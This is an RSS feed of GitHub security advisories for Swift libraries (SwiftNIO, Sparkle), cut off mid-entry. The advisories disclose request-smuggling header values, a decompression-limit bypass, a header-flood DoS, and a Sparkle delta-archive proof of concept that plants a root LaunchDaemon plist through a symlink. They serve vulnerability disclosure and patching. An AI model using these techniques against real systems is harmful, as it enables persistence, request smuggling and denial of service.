<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/swift.rss</id>
    <title>Security Advisory for Swift</title>
    <updated>2026-09-03T21:29:18.471Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Aswift"/>
    <subtitle>Security Advisory for Swift on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[swift-nio-http2] swift-nio-http2: Missing CR/LF/NUL validation in header values]]></title>
        <id>https://github.com/advisories/GHSA-q3g2-m552-3r9c</id>
        <link href="https://github.com/advisories/GHSA-q3g2-m552-3r9c"/>
        <updated>2026-07-24T21:52:11.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>SwiftNIO HTTP/2 was missing validation on inbound HEADERS frames that let
CR, LF, NUL, SP and other control characters reach an HTTP/1.1 backend
through NIOHTTP2's HTTP/2-to-HTTP/1 codec, enabling HTTP request smuggling
or response splitting.</p>
<h2 id="impact">Impact</h2>
<p>Two related gaps in inbound header validation, against any application
using HTTP2ToHTTP1Codec (or HTTP2FramePayloadToHTTP1Codec) to front an
HTTP/1.1 backend:</p>
<p>Regular header field values were only checked against a forbidden-name
list (connection, transfer-encoding, proxy-connection, keep-alive,
upgrade); the value itself was never inspected. An attacker-controlled
regular header field value containing CR or LF passed validation and, once
serialized as <code>name: value CRLF</code> by the codec, terminated the field early
and injected extra header lines into the outbound HTTP/1.1 message.</p>
<p>Pseudo-header values (<code>:path</code> in particular) were only checked against
CR, LF and NUL. A <code>:path</code> value containing SP serializes into the
request-target of <code>METHOD SP request-target SP HTTP-version CRLF</code>, so a
value like <code>/a HTTP/1.1</code> produces <code>GET /a HTTP/1.1 HTTP/1.1</code> — a
parser-differential request line depending on whether a downstream reader
takes the first or last SP-delimited token as the version.</p>
<p>Neither of these is reachable on a stock pipeline: NIOHTTP1's outbound
validator (<code>enableOutboundHeaderValidation</code>, on by default) already rejects
these characters on write. The exposure is pipelines that skip outbound
validation, or any code that reads validated-looking <code>HTTPRequestHead.headers</code>
and forwards the values on trusting that HTTP/2 already checked them.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in 48bfd90 and 45bdf67.</p>
<h2 id="mitigation">Mitigation</h2>
<p>Upgrade to 1.45.0</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apple/swift-nio-http2/security/advisories/GHSA-q3g2-m552-3r9c">https://github.com/apple/swift-nio-http2/security/advisories/GHSA-q3g2-m552-3r9c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-64785">https://nvd.nist.gov/vuln/detail/CVE-2026-64785</a></li>
<li><a href="https://github.com/apple/swift-nio-http2/commit/45bdf670248be5f16ec0340e125dca285536f0fb">https://github.com/apple/swift-nio-http2/commit/45bdf670248be5f16ec0340e125dca285536f0fb</a></li>
<li><a href="https://github.com/apple/swift-nio-http2/commit/48bfd9067d7d1d15c4789440127a0cf36222ea43">https://github.com/apple/swift-nio-http2/commit/48bfd9067d7d1d15c4789440127a0cf36222ea43</a></li>
<li><a href="https://github.com/apple/swift-nio-http2/releases/tag/1.45.0">https://github.com/apple/swift-nio-http2/releases/tag/1.45.0</a></li>
<li><a href="https://github.com/advisories/GHSA-q3g2-m552-3r9c">https://github.com/advisories/GHSA-q3g2-m552-3r9c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q3g2-m552-3r9c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T21:52:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/sparkle-project/Sparkle] Sparkle: Binary delta apply intermediate-symlink traversal in malicious .delta]]></title>
        <id>https://github.com/advisories/GHSA-hg88-v3cw-3qrh</id>
        <link href="https://github.com/advisories/GHSA-hg88-v3cw-3qrh"/>
        <updated>2026-07-21T13:52:01.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Binary delta apply intermediate-symlink traversal in malicious .delta</p>
<p><code>Autoupdate/SUBinaryDeltaApply.m</code> enforces <code>relativePath.pathComponents containsObject:@".."</code> and rejects writes whose immediate parent directory IS itself a symbolic link, but does not detect symlinks deeper in the relative path. <code>Autoupdate/SPUSparkleDeltaArchive.m</code>'s <code>extractItem:</code> will create symlinks in the destination tree from archive content (no <code>..</code> check on the symlink target), and a subsequent <code>Extract</code> item targeting <code>&lt;symlink&gt;/foo/bar</code> then escapes the destination tree via <code>fopen(path, "wb")</code> because the kernel resolves the intermediate symlink during the open call.</p>
<p>This is a defense-in-depth issue: exploitation requires a maliciously-crafted <code>.delta</code> that passes EdDSA signature verification, i.e. EdDSA private-key compromise. With the AppInstaller running as root for system-domain installs, it gives the holder of a stolen signing key arbitrary file write at root level via the delta-apply path, which is a strictly broader primitive than the "drop-in replacement bundle" install they would otherwise have.</p>
<p>Affected versions: 1.x (master branch), 2.x branch including 2.9.1.</p>
<h2 id="details">Details</h2>
<h3 id="symlink-writeable-from-archive">Symlink writeable from archive</h3>
<p><code>Autoupdate/SPUSparkleDeltaArchive.m:557-678</code>'s <code>extractItem:</code> handles symlinks if the archive item carries <code>S_ISLNK(mode)</code>:</p>
<pre><code class="language-objc">} else {
    // Link files

    if (PARTIAL_IO_CHUNK_SIZE &lt; decodedLength) { ...too long... }
    if (decodedLength &gt; PATH_MAX) { ...too long... }

    char buffer[PATH_MAX + 1] = {0};
    if (![self _readBuffer:buffer length:(int32_t)decodedLength]) { ... }

    NSString *destinationPath = [fileManager stringWithFileSystemRepresentation:buffer length:decodedLength];

    [fileManager removeItemAtPath:itemFilePath error:NULL];

    NSError *createLinkError = nil;
    if (![fileManager createSymbolicLinkAtPath:itemFilePath withDestinationPath:destinationPath error:&amp;createLinkError]) {
        _error = createLinkError;
        return NO;
    }
    ...
    lchmod(itemFilePathString, mode);
}
</code></pre>
<p>The link's <code>destinationPath</code> is taken verbatim from the archive content with only a length cap; absolute paths and <code>..</code> are accepted. After this item is processed, the destination tree contains a symlink that points outside it.</p>
<h3 id="parent-symlink-check-is-shallow">Parent-symlink check is shallow</h3>
<p><code>Autoupdate/SUBinaryDeltaApply.m:177-207</code>:</p>
<pre><code class="language-objc">[archive enumerateItems:^(SPUDeltaArchiveItem *item, BOOL *stop) {
    NSString *relativePath = item.relativeFilePath;

    if ([relativePath.pathComponents containsObject:@".."]) {
        ...reject...
    }

    NSString *sourceFilePath = [source stringByAppendingPathComponent:relativePath];
    NSString *destinationFilePath = [destination stringByAppendingPathComponent:relativePath];
    {
        NSString *destinationParentDirectory = destinationFilePath.stringByDeletingLastPathComponent;
        NSDictionary&lt;NSFileAttributeKey, id&gt; *destinationParentDirectoryAttributes = [fileManager attributesOfItemAtPath:destinationParentDirectory error:NULL];

        // It is OK for the directory parent to not exist if it has already been removed
        if (destinationParentDirectoryAttributes != nil) {
            NSString *fileType = destinationParentDirectoryAttributes[NSFileType];
            if ([fileType isEqualToString:NSFileTypeSymbolicLink]) {
                ...reject...
            }
        }
    }
    ...
}];
</code></pre>
<p>Two gaps:</p>
<ol>
<li><p>The check inspects only <code>destinationParentDirectory</code> (one level up), not all intermediate components. For a relative path <code>a/b/c.txt</code>, the kernel resolves through any symlink at component <code>a</code>. <code>attributesOfItemAtPath:</code> with the resolved path returns attributes of the resolved-through directory, which is <code>NSFileTypeDirectory</code> (not <code>NSFileTypeSymbolicLink</code>), so the check passes.</p>
</li>
<li><p>The check is skipped entirely if <code>destinationParentDirectoryAttributes == nil</code> (line 195). When the symlink target is to a directory that does not contain the named subpath, the parent appears not to exist and the check is skipped. The subsequent <code>fopen(path, "wb")</code> then creates the file along the resolved path.</p>
</li>
</ol>
<h3 id="write-primitive">Write primitive</h3>
<p>For an item with <code>SPUDeltaItemCommandExtract</code> set, <code>SUBinaryDeltaApply.m:354-365</code> calls <code>[archive extractItem:item]</code> which goes through <code>SPUSparkleDeltaArchive.m:574-622</code> for regular files:</p>
<pre><code class="language-objc">[fileManager removeItemAtPath:itemFilePath error:NULL];

char itemFilePathString[PATH_MAX + 1] = {0};
if (![itemFilePath getFileSystemRepresentation:itemFilePathString maxLength:sizeof(itemFilePathString) - 1]) { ... }

FILE *outputFile = fopen(itemFilePathString, "wb");
</code></pre>
<p><code>fopen(path, "wb")</code> follows symlinks at every path component and creates/truncates the file at the resolved path. If <code>&lt;dest&gt;/a</code> is a symlink to <code>/Library/LaunchDaemons</code> (for a root install) and the relative path is <code>a/com.attacker.plist</code>, the call writes <code>/Library/LaunchDaemons/com.attacker.plist</code>.</p>
<p>The <code>chmod</code> follow-up at <code>SUBinaryDeltaApply.m:335</code> (<code>chmod(destinationFilePath.fileSystemRepresentation, sourceFileInfo.st_mode)</code>) and <code>SPUSparkleDeltaArchive.m:619</code> (<code>chmod(itemFilePathString, mode)</code>) likewise follows symlinks, so attacker-chosen permissions land on the attacker-chosen target.</p>
<h3 id="threat-model">Threat model</h3>
<p>This primitive is reachable only when the archive can pass EdDSA signature verification, which requires either:</p>
<ul>
<li>The developer's private signing key has been compromised, or</li>
<li>A separate vulnerability allows bypassing <code>SUSignatureVerifier</code> (none was identified in this review).</li>
</ul>
<p>Given a stolen private key, the attacker already has the ability to push a normal full-bundle update. The delta-apply traversal grants strictly more: arbitrary file write into directories outside <code>&lt;destination&gt;</code>. When the AppInstaller runs in the system domain (root), this becomes arbitrary file write as root, which is qualitatively broader than "replace the app bundle".</p>
<p>It is therefore worth fixing as a defense-in-depth measure, even though the prerequisite (key compromise) is itself a worst case.</p>
<h2 id="poc">PoC</h2>
<p>The PoC requires a valid EdDSA signature on the malicious <code>.delta</code> archive. With a test signing key under your control (any Sparkle test fixture key), generate a delta as follows:</p>
<ol>
<li>Construct the archive payload with two items, in this order, using the <code>SPUSparkleDeltaArchive</code> writer (or by hand-assembling the format described in <code>SPUSparkleDeltaArchive.m</code> and <code>SPUDeltaArchiveProtocol.h</code>):</li>
</ol>
<pre><code>Item 1:
  relativeFilePath = "Contents/Resources/escape"
  commands         = SPUDeltaItemCommandExtract  (= 0x02)
  mode             = S_IFLNK | 0o755             (= 0xA1ED)
  payload          = "/Library/LaunchDaemons"

Item 2:
  relativeFilePath = "Contents/Resources/escape/com.attacker.persistence.plist"
  commands         = SPUDeltaItemCommandExtract  (= 0x02)
  mode             = S_IFREG | 0o644             (= 0x81A4)
  payload          = &lt;attacker-chosen LaunchDaemon plist bytes&gt;
</code></pre>
<ol start="2">
<li><p>Sign the archive with the test EdDSA key, publish it as a delta enclosure with matching <code>sparkle:edSignature</code>, and host it from a feed pointed at by a Sparkle host whose old-bundle public key matches.</p>
</li>
<li><p>Trigger a system-domain install. The flow:</p>
<ul>
<li><code>applyBinaryDelta</code> enumerates items.</li>
<li>Item 1 passes the <code>..</code> check (the path components are <code>Contents</code>, <code>Resources</code>, <code>escape</code> - no <code>..</code>). The parent <code>Contents/Resources</code> exists in the source-copy and is a directory, not a symlink. The check passes. <code>extractItem:</code> for <code>S_ISLNK(mode)</code> calls <code>createSymbolicLinkAtPath:withDestinationPath:</code> and creates <code>&lt;dest&gt;/Contents/Resources/escape -&gt; /Library/LaunchDaemons</code>.</li>
<li>Item 2 passes the <code>..</code> check. Its parent <code>&lt;dest&gt;/Contents/Resources/escape</code> resolves through the just-created symlink to <code>/Library/LaunchDaemons</code>, whose attributes are returned as <code>NSFileTypeDirectory</code> (not symlink). The check passes.</li>
<li><code>extractItem:</code> for <code>S_ISREG(mode)</code> does <code>removeItemAtPath</code> (no-op, target file does not yet exist) then <code>fopen("&lt;dest&gt;/Contents/Resources/escape/com.attacker.persistence.plist", "wb")</code>. The kernel resolves the symlink and creates <code>/Library/LaunchDaemons/com.attacker.persistence.plist</code>.</li>
<li>The hash check at the end of <code>applyBinaryDelta</code> (<code>getRawHashOfTreeWithVersion(afterHash, finalDestination, ...)</code>) is computed only against <code>finalDestination</code>. The file dropped at <code>/Library/LaunchDaemons/</code> is outside that tree and does not affect the hash. The hash check still passes (or, if it does not because the dest tree is missing the file, the dropped LaunchDaemon plist is still left behind - destination cleanup at line 471 only removes <code>finalDestination</code>, not the escape target).</li>
</ul>
</li>
<li><p>Observed result: a root-owned LaunchDaemon plist exists at <code>/Library/LaunchDaemons/com.attacker.persistence.plist</code>. On next reboot it is launched as root.</p>
</li>
</ol>
<p>A simpler proof-of-concept that does not require a system-domain install: target a user-writable directory (e.g. <code>~/Library/LaunchAgents/</code>), use a user-domain Sparkle host. The same item-pair lands a user-level LaunchAgent at next login.</p>
<h2 id="impact">Impact</h2>
<p>Defense-in-depth gap: the holder of a compromised EdDSA signing key gains a primitive (arbitrary file write at the privilege of the AppInstaller process) that exceeds what an "install a malicious bundle" path provides. For system-domain installs this is arbitrary file write as root, including locations outside the target app bundle (<code>/Library/LaunchDaemons</code>, <code>/etc/...</code> subpaths that exist as directories, <code>/usr/local/</code>, etc.).</p>
<p>Recommended fix: in <code>SUBinaryDeltaApply.m</code>, walk every component of <code>relativePath</code> and reject if any intermediate component is a symlink (or refuse to allow the archive to create symlinks during apply at all, given the limited number of legitimate use cases for symlinks inside an <code>.app</code> bundle and the existing <code>lchmod</code> already in place). Cleanup on failure should also <code>removeTree</code> along the symlink target, not just <code>finalDestination</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sparkle-project/Sparkle/security/advisories/GHSA-hg88-v3cw-3qrh">https://github.com/sparkle-project/Sparkle/security/advisories/GHSA-hg88-v3cw-3qrh</a></li>
<li><a href="https://github.com/sparkle-project/Sparkle/commit/fe7b718d0736f3e139e374e26fbca96f29e13bf0">https://github.com/sparkle-project/Sparkle/commit/fe7b718d0736f3e139e374e26fbca96f29e13bf0</a></li>
<li><a href="https://github.com/advisories/GHSA-hg88-v3cw-3qrh">https://github.com/advisories/GHSA-hg88-v3cw-3qrh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hg88-v3cw-3qrh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T19:45:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/apple/swift-nio-http2] SwiftNIO HTTP/2: HTTP/2-to-HTTP/1 Request Smuggling via unvalidated :path pseudo-header in HTTP2ToHTTP1Codec]]></title>
        <id>https://github.com/advisories/GHSA-4px2-pw77-vc85</id>
        <link href="https://github.com/advisories/GHSA-4px2-pw77-vc85"/>
        <updated>2026-07-15T21:23:11.000Z</updated>
        <content type="html"><![CDATA[<p>swift-nio-http2's HTTP/2-to-HTTP/1.1 codec (<code>HTTP2FramePayloadToHTTP1ServerCodec</code> / <code>HTTP2ToHTTP1ServerCodec</code>) did not validate pseudo-header values for control characters before placing them into the translated HTTP/1.1 message. A remote attacker could send an HTTP/2 request containing CR (\r), LF (\n), or NUL (\0) bytes in pseudo-header values such as <code>:path</code>, and when the server translated this to HTTP/1.1 — for example in a reverse-proxy configuration — the resulting output could contain injected headers or entirely smuggled requests.</p>
<p>This is an HTTP/2-to-HTTP/1.1 request smuggling vulnerability. HTTP/2's binary framing means that CRLF bytes are never parsed as line terminators at the HTTP/2 layer, so they pass through transparently to the HTTP/1.1 output. Any swift-nio-http2 server that translates HTTP/2 requests to HTTP/1.1 and forwards them to a backend is affected. Server-side Swift frameworks such as Vapor that use this codec in a reverse-proxy pattern are directly affected.</p>
<p>This vulnerability is related to <a href="https://github.com/advisories/GHSA-7fj7-39wj-c64f">https://github.com/advisories/GHSA-7fj7-39wj-c64f</a> in swift-nio, which addressed CRLF injection in HTTP/1.1 header values but did not cover pseudo-header values in the HTTP/2 layer.</p>
<p>This vulnerability is also related to <a href="https://github.com/advisories/GHSA-cq87-8r7h-962v">https://github.com/advisories/GHSA-cq87-8r7h-962v</a> in swift-nio, which addressed CRLF injection in HTTP/1.1 version, method and path.</p>
<p>swift-nio-http2 1.44.0 adds validation of all pseudo-header values (:path, :authority, :scheme, :method, and :status) at both the HPACK header validation layer and the HTTP/2-to-HTTP/1.1 translation layer. Requests or responses containing CR, LF, or NUL bytes in any pseudo-header value are now rejected with a connection error.</p>
<p>SwiftNIO recommends all adopters upgrade to 1.44.0 as soon as possible.</p>
<p>SwiftNIO thanks @kuranikaran for filing this issue and the support in fixing it.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apple/swift-nio-http2/security/advisories/GHSA-4px2-pw77-vc85">https://github.com/apple/swift-nio-http2/security/advisories/GHSA-4px2-pw77-vc85</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28898">https://nvd.nist.gov/vuln/detail/CVE-2026-28898</a></li>
<li><a href="https://github.com/apple/swift-nio-http2/commit/61d1b44f6e4e118792be1cff88ee2bc0267c6f9a">https://github.com/apple/swift-nio-http2/commit/61d1b44f6e4e118792be1cff88ee2bc0267c6f9a</a></li>
<li><a href="https://github.com/advisories/GHSA-4px2-pw77-vc85">https://github.com/advisories/GHSA-4px2-pw77-vc85</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4px2-pw77-vc85</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-12T15:08:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/apple/swift-nio-extras] NIOExtras: NIOHTTPRequestDecompressor ratio limit bypass via inflated Content-Length]]></title>
        <id>https://github.com/advisories/GHSA-6ph5-fww6-vfwv</id>
        <link href="https://github.com/advisories/GHSA-6ph5-fww6-vfwv"/>
        <updated>2026-06-12T15:08:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When <code>NIOHTTPRequestDecompressor</code> is configured with <code>.ratio(N)</code>, the decompression limit is enforced using the <code>Content-Length</code> header value from the incoming request rather than the actual number of compressed bytes received. Since <code>Content-Length</code> is attacker-controlled, a malicious client can supply an inflated value that causes the ratio check to always pass, effectively disabling the configured decompression limit.</p>
<p>This allows an attacker to send a small, highly-compressed payload (a "gzip bomb") with a falsified <code>Content-Length</code> header to bypass the ratio-based protection entirely. The server will decompress the payload without limit, consuming unbounded memory and potentially causing denial of service.</p>
<p>For example, a gzip payload containing highly repetitive data can achieve amplification ratios of several hundred to one. Under <code>.ratio(10)</code> such a payload should be rejected, but if the attacker sets <code>Content-Length</code> to match the decompressed size, the check evaluates <code>decompressed &gt; decompressed * 10</code> which is always false, and the payload is accepted without error.</p>
<p>Across repeated requests, this allows sustained memory amplification far exceeding the configured limits with no error raised.</p>
<h3 id="relationship-to-cve-2020-9840">Relationship to CVE-2020-9840</h3>
<p>GHSA-xhhr-p2r9-jmm7 (CVE-2020-9840) found that the <code>.size</code> limit checked compressed rather than decompressed bytes and recommended <code>.ratio</code> as a workaround. This advisory identifies a distinct flaw in the <code>.ratio</code> limit itself: it uses the attacker-supplied <code>Content-Length</code> header as the denominator rather than actual consumed compressed bytes. The two vulnerabilities are in the same decompression limit enforcement code but involve non-overlapping logic errors.</p>
<p>Users who followed the CVE-2020-9840 workaround by switching to <code>.ratio(N)</code> are affected by this vulnerability.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in swift-nio-extras 1.34.1. The fix unifies the request and response decompressor implementations so that both accumulate actual compressed bytes received (<code>compressedLength += part.readableBytes</code>) rather than relying on any header-supplied value.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Use <code>.size(N)</code> instead of <code>.ratio(N)</code> if a fixed upper bound on decompressed output is acceptable for the application. The <code>.size</code> limit is not affected by this vulnerability as it does not reference <code>Content-Length</code>.</p>
<h3 id="credits">Credits</h3>
<p>NIOExtras is grateful to @nathanielmiller23 for their reporting and assistance with the process.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apple/swift-nio-extras/security/advisories/GHSA-6ph5-fww6-vfwv">https://github.com/apple/swift-nio-extras/security/advisories/GHSA-6ph5-fww6-vfwv</a></li>
<li><a href="https://github.com/advisories/GHSA-6ph5-fww6-vfwv">https://github.com/advisories/GHSA-6ph5-fww6-vfwv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6ph5-fww6-vfwv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-12T15:08:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/apple/swift-nio] SwiftNIO NIOHTTP1:  HTTPDecoder accepts unbounded HTTP/1 header blocks, enabling remote DoS]]></title>
        <id>https://github.com/advisories/GHSA-rj37-6j9x-74q6</id>
        <link href="https://github.com/advisories/GHSA-rj37-6j9x-74q6"/>
        <updated>2026-06-12T15:07:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>HTTPDecoder</code> in <code>NIOHTTP1</code> enforces no limit on the total size of an HTTP/1 message's header block or on the number of header fields per message. A remote peer can submit an arbitrary number of small, valid headers in a single request and have them all accumulated into the resulting <code>HTTPHeaders</code> value before any application code runs. This can be used to exhaust memory, or — for consumers that subsequently convert headers into <code>swift-http-types</code>' <code>HTTPFields</code> — to crash the process.</p>
<h3 id="details">Details</h3>
<p><code>HTTPDecoder</code> previously enforced only a single hardcoded parsing limit: 80 KB per individual header field (name + value). There was no cap on the cumulative size of the header block, nor on the number of header fields per message. Because each individual field can remain well below the 80 KB threshold, a peer can submit hundreds of thousands of valid headers in a single request, all of which are appended to the decoded <code>HTTPHeaders</code> without bound.</p>
<p>The headers are then visible to user code through the standard <code>HTTPServerRequestPart.head</code> / <code>HTTPClientResponsePart.head</code> events. Two observed downstream effects:</p>
<ul>
<li><strong>Hummingbird 2</strong> (and other consumers that bridge <code>HTTPHeaders</code> into <code>swift-http-types</code>' <code>HTTPFields</code>) crashes via a precondition failure inside <code>HTTPFields</code> once the configured field count is exceeded.</li>
<li><strong>Vapor 4</strong> does not crash, but the per-request memory footprint scales linearly with the number of headers received, allowing a single connection to inflate server memory use substantially.</li>
</ul>
<h3 id="impact">Impact</h3>
<p>A single unauthenticated remote peer can trigger a denial of service against any HTTP/1 server (or, in the response direction, any HTTP/1 client) built on <code>NIOHTTP1</code> — either by crashing the process, depending on the downstream framework, or by driving the process's resident memory to arbitrary sizes.</p>
<h3 id="patches">Patches</h3>
<p>This issue is addressed in <code>swift-nio</code> 2.100.0 and later.</p>
<p>The <code>HTTPDecoder</code> now applies three parsing limits with conservative defaults, exposed through the new <code>NIOHTTPDecoderLimitConfiguration</code> type:</p>
<table>
<thead>
<tr>
<th>Limit</th>
<th>Default</th>
</tr>
</thead>
<tbody><tr>
<td><code>maxHeaderFieldSize</code></td>
<td>80 KB</td>
</tr>
<tr>
<td><code>maxHeaderListSize</code></td>
<td>2 MB</td>
</tr>
<tr>
<td><code>maxHeaderFieldCount</code></td>
<td>256</td>
</tr>
</tbody></table>
<p>Exceeding any of these limits causes the decoder to fail with <code>HTTPParserError.headerOverflow</code>. The configuration can be supplied directly to <code>HTTPRequestDecoder</code> / <code>HTTPResponseDecoder</code>, or via the <code>decoderConfiguration</code> property on <code>NIOUpgradableHTTPServerPipelineConfiguration</code> and <code>NIOUpgradableHTTPClientPipelineConfiguration</code>.</p>
<p>Users who require larger limits — for example, applications that legitimately exchange very large header blocks — can opt into them explicitly by constructing a custom <code>NIOHTTPDecoderLimitConfiguration</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users unable to upgrade can mitigate by placing a reverse proxy in front of the service that enforces equivalent limits on request header count and total header size.</p>
<h3 id="credit">Credit</h3>
<p>This issue was reported by @Joannis. SwiftNIO thanks @Joannis for the report and the support in landing the fix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apple/swift-nio/security/advisories/GHSA-rj37-6j9x-74q6">https://github.com/apple/swift-nio/security/advisories/GHSA-rj37-6j9x-74q6</a></li>
<li><a href="https://github.com/advisories/GHSA-rj37-6j9x-74q6">https://github.com/advisories/GHSA-rj37-6j9x-74q6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rj37-6j9x-74q6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-12T15:07:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/apple/swift-nio] SwiftNIO: Out-of-bounds write via ByteBuffer index and length UInt32 overflow]]></title>
        <id>https://github.com/advisories/GHSA-r3rc-9hpw-54v9</id>
        <link href="https://github.com/advisories/GHSA-r3rc-9hpw-54v9"/>
        <updated>2026-06-12T15:07:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A program using swift-nio is vulnerable to a potential out-of-bounds write when attacker-controlled index or length values exceeding <code>UInt32.max</code> are passed to some <code>ByteBuffer</code> methods. This affects all swift-nio versions from 1.0.0 to 2.99.0. It is fixed in 2.100.0 and later releases.</p>
<h3 id="details">Details</h3>
<p><code>ByteBuffer</code> internally stores indices and capacities as <code>UInt32</code> values. The internal helper functions <code>_toIndex</code> and <code>_toCapacity</code>, which convert from <code>Int</code> to <code>UInt32</code>, used <code>UInt32(truncatingIfNeeded:)</code>. On 64-bit platforms, this silently discards the upper 32 bits of the value rather than trapping on overflow. For example, a value of <code>UInt32.max + 1</code> (0x100000000) would be truncated to <code>0</code>.</p>
<p>This truncation can cause safety preconditions to pass when they should fail. Subsequent operations would then use the incorrect truncated value, potentially leading to out-of-bounds memory writes or reads.</p>
<p>The affected <code>ByteBuffer</code> methods that may lead to out-of-bounds writes are:</p>
<ul>
<li><code>copyBytes(at:to:length:)</code> — a crafted destination index exceeding <code>UInt32.max</code> could copy bytes to an incorrect offset.</li>
<li><code>writeWithUnsafeMutableBytes(minimumWritableBytes:)</code> — a crafted <code>minimumWritableBytes</code> exceeding <code>UInt32.max</code> could provide the caller with a buffer pointer of incorrect length, which can easily be subsequently overflowed.</li>
</ul>
<p>The affected <code>ByteBuffer</code> methods that have logic errors but do neither expose out-of-bounds reads nor out-of-bounds writes:</p>
<ul>
<li><code>moveReaderIndex(forwardBy:)</code> / <code>moveWriterIndex(forwardBy:)</code> — a crafted offset exceeding <code>UInt32.max</code> could move indices to incorrect positions, bypassing bounds checks. These indices cannot be out of the bounds of the buffer, so they do not expose access to uninitialized memory or produce wild pointers.</li>
<li>The <code>ByteBuffer(takingOwnershipOf:allocator:)</code> initialiser — passing a buffer larger than <code>UInt32.max</code> bytes could create a <code>ByteBuffer</code> with an incorrect capacity.</li>
</ul>
<p>Outside of these methods, there are still impacts, but they are simply logical bugs. In these cases applications can be forced to read from or write to unexpected parts of the buffer. This does not cause memory-safety issues, but it can cause logical issues or corruption of outbound packets.</p>
<h3 id="impact">Impact</h3>
<p>Exploitation requires an attacker to influence the <code>index</code>, <code>offset</code>, or <code>length</code> parameter of the affected <code>ByteBuffer</code> methods with a value exceeding <code>UInt32.max</code> (approximately 4 GiB). This is a high bar for most applications: attacker-controlled length parameters to ByteBuffer are typically used on the read path, and the above methods are typically not used on the read paths. However, applications that calculate buffer positions arithmetically from untrusted input when attempting to do writes, or that process very large payloads, may be at risk of memory safety issues.</p>
<p>Other applications may encounter logical issues due to reading unexpected bytes, or writing to unexpected parts of the buffer.</p>
<p>When the memory-safety issue is exploitable, the consequences are severe. Because <code>truncatingIfNeeded</code> silently produces an incorrect but valid <code>UInt32</code> value, subsequent operations may write to or read from memory outside the valid buffer region. In optimised (release) builds where preconditions are not checked, this could lead to out-of-bounds memory writes, potentially corrupting adjacent heap memory.</p>
<p>In debug builds, some of these conditions are caught by assertions, but <code>truncatingIfNeeded</code> occurs before the assertion checks the (already-truncated) value, so even assertions may not reliably catch the issue.</p>
<h3 id="patches">Patches</h3>
<p>The issue is fixed by replacing <code>UInt32(truncatingIfNeeded:)</code> with <code>UInt32(_:)</code> in the <code>_toIndex</code> and <code>_toCapacity</code> helper functions. The <code>UInt32(_:)</code> initialiser traps on overflow in both debug and release builds, converting a potential silent memory corruption into a deterministic crash.</p>
<p>One call site in <code>getSlice(at:length:)</code> retains <code>truncatingIfNeeded</code> because prior bounds checks against the non-truncated <code>Int</code> values mathematically guarantee the values fit within <code>UInt32</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Applications can mitigate this issue by validating that all index and length values passed to <code>ByteBuffer</code> methods do not exceed <code>UInt32.max</code> (4,294,967,295). In practice, most applications are not affected because buffer indices are derived from protocol parsing rather than raw untrusted input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apple/swift-nio/security/advisories/GHSA-r3rc-9hpw-54v9">https://github.com/apple/swift-nio/security/advisories/GHSA-r3rc-9hpw-54v9</a></li>
<li><a href="https://github.com/advisories/GHSA-r3rc-9hpw-54v9">https://github.com/advisories/GHSA-r3rc-9hpw-54v9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r3rc-9hpw-54v9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-12T15:07:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/apple/swift-nio] SwiftNIO: CRLF Injection in outbound HTTP request URI via NIOHTTPRequestHeadersValidator]]></title>
        <id>https://github.com/advisories/GHSA-cq87-8r7h-962v</id>
        <link href="https://github.com/advisories/GHSA-cq87-8r7h-962v"/>
